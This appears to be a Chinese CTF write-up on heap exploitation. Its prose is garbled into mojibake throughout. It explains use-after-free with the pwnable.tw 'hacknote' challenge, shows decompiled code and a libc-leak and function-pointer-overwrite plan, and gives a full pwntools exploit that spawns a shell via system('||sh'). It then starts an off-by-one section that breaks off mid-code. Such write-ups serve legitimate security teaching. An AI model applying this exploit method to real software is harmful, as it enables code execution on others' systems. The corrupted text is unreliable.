å°±æ˜¯å…¶å­—é¢æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨ã€‚ä½†æ˜¯å…¶å®è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</li></ul><p>è€Œæˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ <strong>Use After Free</strong> æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œ<strong>æˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚</strong> </p><h2 id="ä¾‹å­-â€“-pwnable-tw-hacknote"><a href="#ä¾‹å­-â€“-pwnable-tw-hacknote" class="headerlink" title="ä¾‹å­ â€“ pwnable.tw_hacknote"></a>ä¾‹å­ â€“ pwnable.tw_hacknote</h2><p>é¢˜ç›®åœ¨ <a href="../../files/hacknote.zip">è¿™é‡Œ</a> ä¸‹è½½</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> root @ Kiprey <span class="hljs-keyword">in</span> ~/Desktop/Pwn [14:16:43]</span><br><span class="hljs-meta">$</span><span class="bash"> checksec hacknote</span>  <br>[*] &#x27;/root/Desktop/Pwn/hacknote&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></div></td></tr></table></figure><h2 id="å…³é”®å‡½æ•°"><a href="#å…³é”®å‡½æ•°" class="headerlink" title="å…³é”®å‡½æ•°"></a>å…³é”®å‡½æ•°</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )  <span class="hljs-comment">//æœ€å¤šæ”¾äº”ä¸ªchunk</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) ) <span class="hljs-comment">//å¦‚æœè¯¥ä½ç½®ä¸ºç©º, çŒœæµ‹åº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„, å…ƒç´ æ˜¯æŒ‡å‘chunkçš„æŒ‡é’ˆ</span><br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>); <span class="hljs-comment">//mallocäº†å…«å­—èŠ‚</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = sub_804862B; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-keyword">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-comment">//è¿™é‡Œå¯ä»¥çŸ¥é“æ•°ç»„å…ƒç´ æŒ‡å‘ä¸€ä¸ªç»“æ„ä½“, è¿™ä¸ªç»“æ„ä½“æœ‰ä¸¤ä¸ªæŒ‡é’ˆ</span><br>          <span class="hljs-comment">//ç¬¬ä¸€ä¸ªæ˜¯å‡½æ•°sub_804862Bçš„æŒ‡é’ˆ, ç¬¬äºŒä¸ªæ˜¯contentæŒ‡é’ˆ,mallocå‡ºæ¥çš„</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub_80487D4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<span class="hljs-comment">//å…ˆfreecontent</span><br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));<span class="hljs-comment">//å†free chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>); <span class="hljs-comment">//å¹¶æœªè®¾ç½®NULL</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    <span class="hljs-comment">//&amp;ptr + v1æ˜¯å‡½æ•°æŒ‡é’ˆçš„åœ°å€,è§£å¼•ç”¨åå¾—åˆ°æ”¹åœ°å€ä¸Šçš„å‡½æ•°æŒ‡é’ˆ, å‰é¢çš„æ˜¯å‡½æ•°å¤´</span><br>    <span class="hljs-comment">//å°±æ˜¯è°ƒç”¨å­˜åœ¨æ”¹åœ°å€çš„putå‡½æ•°</span><br>    (*(<span class="hljs-keyword">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1)) (*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li><p class="note note-info"><strong>UAF--use after free</strong>, è¦åœ¨freeåå†æ¬¡ä½¿ç”¨ä¸€èˆ¬æ˜¯åœ¨freeåæŒ‡é’ˆå¹¶æœªè®¾ç½®ä¸ºNULL. è¿™æ˜¯UAFä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ‡å¿—</p> </li><li><p>è¿™é‡Œçš„deleteå‡½æ•°ä¸­å°±æ²¡æœ‰åœ¨freeåé¢è®¾ç½®NULL, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨fastbiné“¾çš„ç‰¹æ€§ï¼Œæ¥ä½¿ä¸€ä¸ªå¯ä¿®æ”¹çš„æŒ‡é’ˆæŒ‡å‘æŸä¸ªè¢«é‡Šæ”¾çš„noteçš„funcæˆå‘˜æŒ‡é’ˆï¼Œè¿›è€Œä¿®æ”¹è¯¥æŒ‡é’ˆå¹¶æ‰§è¡Œå…¶æŒ‡å‘çš„å‡½æ•°</p></li><li><p>è¿‡ç¨‹åˆ†æ:</p><ol><li>æˆ‘ä»¬å¯ä»¥å…ˆå£°æ˜ä¸¤ä¸ªnoteï¼Œåˆ†åˆ«ç§°ä¸ºnote0ã€note1ï¼Œæ³¨æ„è¿™ä¸¤ä¸ªnoteçš„content sizeå¿…é¡»&gt;12ï¼Œ è¿™æ ·content chunk<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="ä¸ä¸Šæ¡ç±»ä¼¼ï¼Œæˆ‘ä»¬åŒæ ·å°†åˆ†é…ä½œä¸ºcontentçš„chunkç§°ä¸ºcontent chunk">[1]</span></a></sup>çš„å¤§å°å°±ä¼š <strong>å¤§äº</strong> note chunk<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†åˆ†é…ä½œä¸ºnoteçš„chunkç§°ä¸ºnote chunk">[2]</span></a></sup>çš„å¤§å° . <u>æ­¤æ—¶note chunkçš„user sizeä¸º(8+4)bytes, content chunkçš„user sizeä¸º(ç”³è¯·çš„å¤§å°+4)</u> </li></ol><div class="hljs code-wrapper"><pre><code>å¦‚æ­¤ï¼Œå½“è¿™ä¸¤ä¸ªnoteéƒ½è¢«é‡Šæ”¾æ—¶ï¼Œä¸¤ä¸ªnoteçš„note chunkä¼šæ”¾ç½®è¿›ç›¸åŒç´¢å¼•çš„fast biné“¾é‡Œï¼Œè€Œå¦å¤–ä¸¤ä¸ªcontent chunkåˆ™ä¼šæ”¾ç½®è¿› **å¦ä¸€ä¸ªç´¢å¼•** çš„fast biné“¾é‡Œã€‚ note chunk å’Œ content chunk åœ¨fast biné“¾ä¸­äº’ä¸å¹²æ‰°</code></pre></div><ol start="2"><li>ç¬¬äºŒæ­¥å°±æ˜¯æ–°å»ºä¸€ä¸ªæ–°çš„note2ï¼Œæ³¨æ„è¯¥noteçš„content sizeè¦&lt;=12åˆ†é…åˆ°<strong>fastbinä¸Šnote1</strong>çš„ç©ºé—´ï¼Œæˆä¸ºnote2çš„content chunk</li><li><strong>æ³¨æ„</strong>ï¼šå½“ç¨‹åºå¯ä»¥æ‰§è¡Œsystemå‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„åœ°å€ä¸ºnote2çš„åœ°å€ï¼Œæ‰€ä»¥<code>[system addr]</code> ä»¥åŠå…¶å4ä¸ªå­—èŠ‚éƒ½ä¼šè¢«è§£é‡Šæˆå­—ç¬¦ä¸²å°è¯•æ‰§è¡Œã€‚ä½†[system addr]åˆå¿…é¡»ä¿ç•™ï¼Œé‚£è¯¥å¦‚ä½•get shellå‘¢ï¼Ÿ<br> è¿™é‡Œæœ‰ä¸ªå°æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ€åå››ä¸ªå­—èŠ‚æ„é€ <code>&quot;||sh&quot;</code>ã€‚è¿™æ ·ä¾¿ä¼šæ‰§è¡Œ<code>system(&quot;[system addr]||sh&quot;)</code><br> ç”±äº<code>[system addr]</code>è‚¯å®šæ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥ä¾¿ä¼šæ‰§è¡Œåˆ°åé¢çš„<code>sh</code>ã€‚è¿™æ ·ä¾¿å¯ä»¥get shell</li></ol></li></ul><h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><ol><li><p>æ–°å»ºnote0ã€note1ï¼Œå…¶note sizeå¿…é¡»å¤§äº12</p></li><li><p>é‡Šæ”¾note0ã€note1</p></li><li><p>æ–°å»ºnote2ï¼Œå…¶note sizeå¿…é¡»&lt;=12ã€‚</p><p>æ­¤æ—¶note2-&gt;contentæŒ‡é’ˆå°±ä¼šæŒ‡å‘note1ï¼Œåœ¨æ–°å»ºçš„è¿‡ç¨‹ä¸­ï¼Œä¾¿å¯ä¿®æ”¹å†…å­˜ä¸Šçš„å†…å­˜ã€‚</p><ul><li>ä¿®æ”¹note1-&gt;funcä¸ºputs()å‡½æ•°ï¼ˆfuncæŒ‡é’ˆé»˜è®¤è®¾ç½®çš„å‡½æ•°)</li><li>ä¿®æ”¹note1-&gt;contentä¸º<code>got@__libc_start_main</code>ï¼ˆéšä¾¿å“ªä¸ªå·²ç»å»¶è¿Ÿç»‘å®šè¿‡çš„å‡½æ•°éƒ½è¡Œï¼‰</li></ul></li><li><p>è¾“å‡ºnote1çš„å†…å®¹ï¼ˆprint note1ï¼‰ï¼Œä»è€Œæ³„éœ²libcåŸºåœ°å€ï¼Œè¿›è€Œç¡®å®š<code>system</code>å‡½æ•°çš„åœ°å€</p></li><li><p>é‡Šæ”¾note2å¹¶é‡æ–°å»ºç«‹note2ï¼Œå…¶note sizeä»ç„¶å¿…é¡»&lt;=12</p><p>åœ¨å»ºç«‹note2è¿‡ç¨‹ä¸­ï¼Œä¿®æ”¹ä»¥ä¸‹å†…å®¹</p><ul><li>ä¿®æ”¹note1-&gt;funcä¸º<code>system</code>å‡½æ•°</li><li>ä¿®æ”¹note1-&gt;contentä¸º<code>&quot;||sh&quot;</code>å­—ç¬¦ä¸²</li></ul></li><li><p>è¾“å‡ºnote1çš„å†…å®¹ï¼ˆprint note1ï¼‰ æ‰§è¡Œsystem(â€œshâ€)ï¼Œ get shellï¼</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br>context(terminal=[<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>], os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span>(<span class="hljs-params"><span class="hljs-built_in">len</span>, content</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Note size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>    io.sendlineafter(<span class="hljs-string">&quot;Content :&quot;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># æ–°å»ºnote0å’Œnote1å¹¶åˆ é™¤ï¼Œæ³¨æ„åˆ é™¤é¡ºåº</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>delnote(<span class="hljs-number">1</span>)<br>delnote(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># æ–°å»ºnote2ï¼Œå†™å…¥æ•°æ®å¹¶æ‰§è¡Œ</span><br>addnote(<span class="hljs-number">8</span>, flat(<span class="hljs-number">0x0804862B</span>, e.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br>printnote(<span class="hljs-number">1</span>)<br> <span class="hljs-comment"># ä¸Šä¸€æ­¥æ³„éœ²å‡ºäº†libcåœ°å€ï¼Œå¤„ç†å¾—åˆ°systemå‡½æ•°åœ°å€</span><br>libc_read_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;libc read addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_read_addr))<br><span class="hljs-comment"># åˆ é™¤note2</span><br>delnote(<span class="hljs-number">2</span>)<br><br>libcbase_addr = libc_read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system_addr = libcbase_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&#x27;libcbase addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase_addr))<br>log.success(<span class="hljs-string">&#x27;system addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># é‡æ–°å»ºç«‹note2ï¼Œå†™å…¥systemåœ°å€å’Œ&#x27;||sh&#x27;å­—ç¬¦ä¸²ï¼Œæ‰§è¡Œå‡½æ•°</span><br>addnote(<span class="hljs-number">8</span>, flat(system_addr, <span class="hljs-string">&#x27;||sh&#x27;</span>)) <span class="hljs-comment"># 8æˆ–è€…12éƒ½æ˜¯å¯ä»¥çš„</span><br><br>printnote(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># get shellï¼</span><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="Off-by-one"><a href="#Off-by-one" class="headerlink" title="Off-by-one"></a>Off-by-one</h1><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•</li><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾— <code>prev_in_use</code> ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚ï¼ˆ1ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•ï¼ˆè§ unlink éƒ¨åˆ†ï¼‰è¿›è¡Œå¤„ç†ã€‚ï¼ˆ2ï¼‰ å¦å¤–ï¼Œè¿™æ—¶ <code>prev_size</code> åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  <code>prev_size</code> ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§ <code>prev_size</code> æ‰¾åˆ°çš„å—çš„å¤§å°ä¸<code>prev_size</code> æ˜¯å¦ä¸€è‡´ã€‚</li></ol><p>æœ€æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œå·²åŠ å…¥é’ˆå¯¹ 2 ä¸­åä¸€ç§æ–¹æ³•çš„ check ï¼Œä½†æ˜¯åœ¨ 2.28 åŠä¹‹å‰ç‰ˆæœ¬å¹¶æ²¡æœ‰è¯¥ check ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>      <span class="hljs-comment">/* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely 